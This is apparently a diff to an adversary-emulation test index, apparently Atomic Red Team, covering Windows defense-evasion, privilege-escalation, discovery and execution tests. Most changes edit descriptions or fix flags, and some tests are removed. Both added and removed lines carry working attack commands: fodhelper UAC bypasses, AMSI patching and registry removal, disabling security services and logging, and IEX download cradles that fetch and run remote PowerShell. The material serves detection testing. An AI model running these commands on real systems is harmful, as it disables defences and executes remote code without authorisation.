@@ -5754,10 +5754,9 @@ defense-evasion:
 
 '
     - name: Bypass UAC using Fodhelper
-      description: 'Bypasses User Account Control using the Windows 10 Features on
-        Demand Helper (fodhelper.exe). Requires Windows 10.
-
-'
+      description: |
+        Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+        Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.
       supported_platforms:
       - windows
       input_arguments:
@@ -5770,17 +5769,16 @@ defense-evasion:
         elevation_required: false
         command: |
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
-          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
           fodhelper.exe
         cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f >nul
           2>&1
 
 '
     - name: Bypass UAC using Fodhelper - PowerShell
-      description: 'PowerShell code to bypass User Account Control using the Windows
-        10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
-
-'
+      description: |
+        PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+        Upon execution command prompt will be opened.
       supported_platforms:
       - windows
       input_arguments:
@@ -7140,6 +7138,8 @@ defense-evasion:
     - name: AMSI Bypass - AMSI InitFailed
       description: |
         Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+        Upon execution, no output is displayed.
+
         https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
       supported_platforms:
       - windows
@@ -7147,12 +7147,12 @@ defense-evasion:
         name: powershell
         elevation_required: false
         command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
-        cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
-          -ErrorAction Ignore\n"
+        cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"
     - name: AMSI Bypass - Remove AMSI Provider Reg Key
       description: |
         With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
-        This test removes the Windows Defender provider registry key.
+        This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
+        Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" to verify that it is gone.
       supported_platforms:
       - windows
       executor:
@@ -7167,10 +7167,10 @@ defense-evasion:
 
 '
     - name: Disable Arbitrary Security Windows Service
-      description: 'With administrative rights, an adversary can disable Windows Services
-        related to security products.
-
-'
+      description: |
+        With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.
+        Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.
+        To verify that the service has stopped, run "sc query McAfeeDLPAgentService"
       supported_platforms:
       - windows
       input_arguments:
@@ -7187,39 +7187,6 @@ defense-evasion:
         cleanup_command: |
           sc.exe config #{service_name} start= auto >nul 2>&1
           net.exe start #{service_name} >nul 2>&1
-    - name: Disable PowerShell Script Block Logging
-      description: |
-        An adversary may disable PowerShell Script Block Logging to avoid leaving evidence.
-
-        Credit to Matt Graeber (@mattifestation) for the research.
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        elevation_required: false
-        command: |
-          $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-          $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
-          $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
-          $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
-        cleanup_command: |
-          $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-          $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
-          $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 1
-          $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 1
-    - name: PowerShell Bypass of AntiMalware Scripting Interface
-      description: |
-        An adversary may bypass Windows Defender AMSI to execute malicious PowerShell code.
-
-        Credit to Matt Graeber (@mattifestation) for the research.
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        elevation_required: false
-        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)
-
-'
     - name: Tamper with Windows Defender ATP PowerShell
       description: |
         Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
@@ -7242,7 +7209,8 @@ defense-evasion:
     - name: Tamper with Windows Defender Command Prompt
       description: |
         Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.
-        However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on.
+        However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, "Access Denied"
+        will be displayed twice and the WinDefend service status will be displayed.
       supported_platforms:
       - windows
       executor:
@@ -7275,7 +7243,7 @@ defense-evasion:
     - name: Disable Microft Office Security Features
       description: |
         Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
-        show any warning before editing the document
+        show any warning before editing the document.
 
 
         https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
@@ -13899,10 +13867,9 @@ privilege-escalation:
 
 '
     - name: Bypass UAC using Fodhelper
-      description: 'Bypasses User Account Control using the Windows 10 Features on
-        Demand Helper (fodhelper.exe). Requires Windows 10.
-
-'
+      description: |
+        Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+        Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.
       supported_platforms:
       - windows
       input_arguments:
@@ -13915,17 +13882,16 @@ privilege-escalation:
         elevation_required: false
         command: |
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
-          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
           fodhelper.exe
         cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f >nul
           2>&1
 
 '
     - name: Bypass UAC using Fodhelper - PowerShell
-      description: 'PowerShell code to bypass User Account Control using the Windows
-        10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
-
-'
+      description: |
+        PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+        Upon execution command prompt will be opened.
       supported_platforms:
       - windows
       input_arguments:
@@ -17127,7 +17093,8 @@ discovery:
           net localgroup "Users"
           net localgroup
     - name: Enumerate all accounts via PowerShell
-      description: 'Enumerate all accounts via PowerShell
+      description: 'Enumerate all accounts via PowerShell. Upon execution, lots of
+        user account and group information will be displayed.
 
 '
       supported_platforms:
@@ -17147,8 +17114,9 @@ discovery:
           get-aduser -filter *
           get-localgroup
           net localgroup
-    - name: Enumerate logged on users
-      description: 'Enumerate logged on users
+    - name: Enumerate logged on users via CMD
+      description: 'Enumerate logged on users. Upon exeuction, logged on users will
+        be displayed.
 
 '
       supported_platforms:
@@ -17160,7 +17128,8 @@ discovery:
 
 '
     - name: Enumerate logged on users via PowerShell
-      description: 'Enumerate logged on users via PowerShell
+      description: 'Enumerate logged on users via PowerShell. Upon exeuction, logged
+        on users will be displayed.
 
 '
       supported_platforms:
@@ -23385,13 +23354,10 @@ execution:
 
 '
     - name: Run BloodHound from local disk
-      description: "Upon execution SharpHound will be downloaded to disk, imported
-        and executed. It will set up collection methods, run and then compress and
-        store the data to the temp directory on the machine. If system is unable to
-        contact a domain, proper execution will not occur.\n\nSuccessful execution
-        will produce stdout reporting LDAP connection was successful and BloodHound
-        domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip
-        file. \n"
+      description: |
+        Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.
+
+        Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file.
       supported_platforms:
       - windows
       input_arguments:
@@ -23417,19 +23383,17 @@ execution:
       executor:
         name: powershell
         elevation_required: false
-        command: "write-host \"Import and Execution of SharpHound.ps1 from #{file_path}\"
-          -ForegroundColor Cyan\nimport-module #{file_path}\\SharpHound.ps1; invoke-bloodhound
-          -domain #{internal_domain} -OutputDirectory #{output_path}\n \n"
+        command: |
+          write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
+          import-module #{file_path}\SharpHound.ps1; invoke-bloodhound -domain #{internal_domain} -OutputDirectory #{output_path}
         cleanup_command: |
           Remove-Item #{file_path}\SharpHound.ps1 -Force
           Remove-Item #{file_path}\*BloodHound.zip -Force
     - name: Run Bloodhound from Memory using Download Cradle
-      description: "Upon execution SharpHound will load into memory and execute against
-        a domain. It will set up collection methods, run and then compress and store
-        the data to #{output_path}. If system is unable to contact a domain, proper
-        execution will not occur.\n\nSuccessful execution will produce stdout reporting
-        LDAP connection was successful and BloodHound domain enumeration is occurring.
-        Upon completion, final output will be a *BloodHound.zip file. \n"
+      description: |
+        Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to #{output_path}. If system is unable to contact a domain, proper execution will not occur.
+
+        Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file.
       supported_platforms:
       - windows
       input_arguments:
@@ -23440,17 +23404,18 @@ execution:
       executor:
         name: powershell
         elevation_required: false
-        command: "write-host \"Remote download of SharpHound.ps1, import and execution
-          from $env:temp\" -ForegroundColor Cyan\npowershell -exec Bypass -C \"IEX(New-Object
-          Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');Invoke-BloodHound
-          -OutputDirectory #{output_path}\"\n \n"
+        command: |
+          write-host "Remote download of SharpHound.ps1, import and execution from $env:temp" -ForegroundColor Cyan
+          powershell -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');Invoke-BloodHound -OutputDirectory #{output_path}"
         cleanup_command: 'Remove-Item #{output_path}\*BloodHound.zip -Force
 
 '
     - name: Obfuscation Tests
-      description: |
-        Different obfuscated methods to test
-        Reaches out to bit.ly/L3g1t to stdout: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
+      description: 'Different obfuscated methods to test. Upon execution, reaches
+        out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM
+        REMOTE LOCATION"
+
+'
       supported_platforms:
       - windows
       executor:
@@ -23486,9 +23451,9 @@ execution:
           -dumpcr\n"
     - name: Invoke-AppPathBypass
       description: |
-        Note: Windows 10 only
+        Note: Windows 10 only. Upon execution windows backup and restore window will be opened.
+
         Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
-        Upon execution windows backup and restore window will be opened
       supported_platforms:
       - windows
       executor:
@@ -23496,26 +23461,6 @@ execution:
         elevation_required: false
         command: 'Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'');
           Invoke-AppPathBypass -Payload ''C:\Windows\System32\cmd.exe''"
-
-'
-    - name: Powershell MsXml COM object - no prompt
-      description: |
-        Provided by https://github.com/mgreen27/mgreen27.github.io
-        Powershell MsXml COM object.
-        Not proxy aware removing cache although does not appear to write to those locations
-      supported_platforms:
-      - windows
-      input_arguments:
-        url:
-          description: url of payload to execute
-          type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1
-      executor:
-        name: command_prompt
-        elevation_required: false
-        command: 'powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object
-          -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open(''GET'',''#{url}'',$False);$comMsXml.Send();IEX
-          $comMsXml.ResponseText"
 
 '
     - name: Powershell MsXml COM object - with prompt
@@ -23604,9 +23549,10 @@ execution:
           Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
           Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
     - name: PowerShell Downgrade Attack
-      description: 'Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
+      description: |
+        This test requires the manual installation of PowerShell V2.
 
-'
+        Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
       supported_platforms:
       - windows
       dependencies:
